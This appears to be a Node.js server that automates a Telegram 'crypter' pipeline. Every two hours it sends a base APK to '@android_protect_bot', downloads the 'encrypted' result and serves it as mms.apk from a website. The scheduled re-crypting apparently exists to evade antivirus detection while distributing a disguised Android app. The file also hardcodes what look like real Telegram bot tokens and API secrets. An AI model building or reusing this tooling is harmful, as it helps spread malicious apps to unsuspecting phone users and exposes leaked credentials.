const express = require('express');
const path = require('path');
const fs = require('fs');
const http = require('http');
const https = require('https');
const TelegramBot = require('node-telegram-bot-api');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');
const input = require('input');

// ─── CONFIG ─────────────────────────────────
const BOT_TOKEN = '8683849614:AAFi-qRF4NuxrJZMZX-f4xBU9GBWEWJL6Jk';
const apiId = 35032020;
const apiHash = "30f11b1f14d8567cd552cb6cdec9bd43";
const TARGET_BOT = "@android_protect_bot";
const WEBSITE_DIR = __dirname;
const TARGET_APK = 'mms.apk';
const BASE_APK = 'base.apk';
const PORT = 3000;
const SESSION_FILE = path.join(__dirname, 'tg_session.txt');
const CONFIG_FILE = path.join(__dirname, 'bot_config.json');

// ─── ADMIN BOT SETUP ────────────────────────
const adminBot = new TelegramBot(BOT_TOKEN, { polling: true });
let TARGET_CHAT_ID = null;

try {
    const cfg = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
    TARGET_CHAT_ID = cfg.chatId;
} catch (e) {}

adminBot.onText(/\/start/, (msg) => {
    adminBot.sendMessage(msg.chat.id, '🤖 *Automated APK Admin Bot*\n\nSend /setchat to receive updates here.', { parse_mode: 'Markdown' });
});

adminBot.onText(/\/setchat/, (msg) => {
    TARGET_CHAT_ID = msg.chat.id;
    fs.writeFileSync(CONFIG_FILE, JSON.stringify({ chatId: TARGET_CHAT_ID }));
    adminBot.sendMessage(msg.chat.id, '✅ This chat will now receive deployment notifications! You can drop `.apk` files here to set the base APK.');
});

// Admin Bot: Listen for Base APK uploads
adminBot.on('document', async (msg) => {
    const isApk = msg.document && msg.document.file_name && msg.document.file_name.endsWith('.apk');
    if (!isApk || msg.from.is_bot) return;

    if (!TARGET_CHAT_ID) TARGET_CHAT_ID = msg.chat.id;

    adminBot.sendMessage(msg.chat.id, `📥 Downloading new base APK (\`${msg.document.file_name}\`)...`, { parse_mode: 'Markdown' });

    try {
        const fileLink = await adminBot.getFileLink(msg.document.file_id);
        const basePath = path.join(WEBSITE_DIR, BASE_APK);
        const file = fs.createWriteStream(basePath);
        const proto = fileLink.startsWith('https') ? https : http;

        proto.get(fileLink, (response) => {
            response.pipe(file);
            file.on('finish', () => {
                file.close();
                
                // Save original name
                let cfg = {};
                try { cfg = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')); } catch(e){}
                cfg.baseApkName = msg.document.file_name;
                fs.writeFileSync(CONFIG_FILE, JSON.stringify(cfg));

                adminBot.sendMessage(msg.chat.id, `✅ Saved as \`base.apk\`. Triggering the auto-encryption cycle now!`, { parse_mode: 'Markdown' });
                runAutoEncryption(); // Trigger encryption cycle
            });
        });
    } catch (err) {
        adminBot.sendMessage(msg.chat.id, `❌ Failed to download base APK: ${err.message}`);
    }
});

function notifyAdmin(message) {
    if (TARGET_CHAT_ID) {
        adminBot.sendMessage(TARGET_CHAT_ID, message, { parse_mode: 'Markdown' }).catch(e => console.log('Notify Error:', e.message));
    }
}

// ─── USER CLIENT SETUP (GramJS) ─────────────
let sessionString = "";
if (fs.existsSync(SESSION_FILE)) {
    sessionString = fs.readFileSync(SESSION_FILE, 'utf8');
}
const stringSession = new StringSession(sessionString);
const client = new TelegramClient(stringSession, apiId, apiHash, { connectionRetries: 5 });

const INTERVAL_HOURS = 2;
const INTERVAL_MS = INTERVAL_HOURS * 60 * 60 * 1000;
let isWaitingForEncryption = false;

async function startTelegramClient() {
    console.log("Loading Telegram User Client for Auto-Encryption...");
    await client.start({
        phoneNumber: async () => await input.text('Please enter your phone number (e.g. +1234567890): '),
        password: async () => await input.text('Please enter your password (if 2FA enabled): '),
        phoneCode: async () => await input.text('Please enter the code you received on Telegram: '),
        onError: (err) => console.log(err),
    });
    
    console.log("✅ User Client successfully logged in!");
    fs.writeFileSync(SESSION_FILE, client.session.save());
    notifyAdmin(`✅ **User Client Logged In!**\nThe 2-hour auto-encryption loop is active.`);

    setInterval(runAutoEncryption, INTERVAL_MS);
    client.addEventHandler(onBotMessage, new NewMessage({ chats: [TARGET_BOT] }));
}

async function runAutoEncryption() {
    const basePath = path.join(WEBSITE_DIR, BASE_APK);
    if (!fs.existsSync(basePath)) {
        console.log(`⚠️ Cannot run auto-encryption: ${BASE_APK} not found.`);
        return;
    }

    console.log(`\n[${new Date().toLocaleString()}] 🔄 Starting automated encryption cycle...`);
    
    let cfg = {};
    try { cfg = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')); } catch(e){}
    const originalName = cfg.baseApkName || 'mms.apk';
    notifyAdmin(`🔄 **Auto-Encryption Started**\nSending \`${originalName}\` to ${TARGET_BOT}...`);

    const tempUploadPath = path.join(WEBSITE_DIR, originalName);
    if (basePath !== tempUploadPath) {
        if (fs.existsSync(tempUploadPath)) fs.unlinkSync(tempUploadPath);
        fs.copyFileSync(basePath, tempUploadPath);
    }

    try {
        isWaitingForEncryption = true;
        await client.sendFile(TARGET_BOT, {
            file: tempUploadPath,
            caption: 'Auto-encryption trigger',
            forceDocument: true
        });
        
        if (basePath !== tempUploadPath && fs.existsSync(tempUploadPath)) {
            fs.unlinkSync(tempUploadPath);
        }
    } catch (err) {
        if (basePath !== tempUploadPath && fs.existsSync(tempUploadPath)) fs.unlinkSync(tempUploadPath);
        isWaitingForEncryption = false;
        notifyAdmin(`❌ Auto-encryption failed to send file: ${err.message}`);
    }
}

async function onBotMessage(event) {
    const message = event.message;
    if (isWaitingForEncryption && message.document) {
        const attributes = message.document.attributes.filter(attr => attr.className === 'DocumentAttributeFilename');
        const filename = attributes.length > 0 ? attributes[0].fileName : '';
        
        if (filename.endsWith('.apk')) {
            notifyAdmin(`📥 Received encrypted APK from bot. Downloading and deploying...`);
            
            const targetPath = path.join(WEBSITE_DIR, TARGET_APK);
            const tmpPath = targetPath + '.tmp';
            
            try {
                // Stream directly to file to prevent memory and connection issues with large APKs
                await client.downloadMedia(message.document, {
                    outputFile: tmpPath,
                    progressCallback: (downloaded, total) => {
                        // Print progress every 10MB to avoid console spam
                        if (downloaded % (10 * 1024 * 1024) < 131072) {
                            console.log(`Download Progress: ${formatBytes(downloaded)} / ${formatBytes(total)}`);
                        }
                    }
                });
                
                if (fs.existsSync(targetPath)) fs.unlinkSync(targetPath);
                fs.renameSync(tmpPath, targetPath);
                
                const stats = fs.statSync(targetPath);
                notifyAdmin(`✅ **Deployment Complete!**\nNew \`${TARGET_APK}\` is live on your website. Size: ${formatBytes(stats.size)}\n\nNext automated run in 2 hours.`);
                isWaitingForEncryption = false;
            } catch (err) {
                console.error("❌ Download error:", err);
                notifyAdmin(`❌ Failed to download encrypted APK: ${err.message}`);
            }
        }
    }
}

function formatBytes(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(2) + ' MB';
}

// ─── EXPRESS SERVER ─────────────────────────
const app = express();
app.use(express.static(WEBSITE_DIR));

app.listen(PORT, () => {
    console.log('\n╔══════════════════════════════════════╗');
    console.log('║   🚀 Hybrid APK Server Running       ║');
    console.log('╚══════════════════════════════════════╝');
    console.log(`\n🌐 Website: http://localhost:${PORT}`);
    startTelegramClient();
});
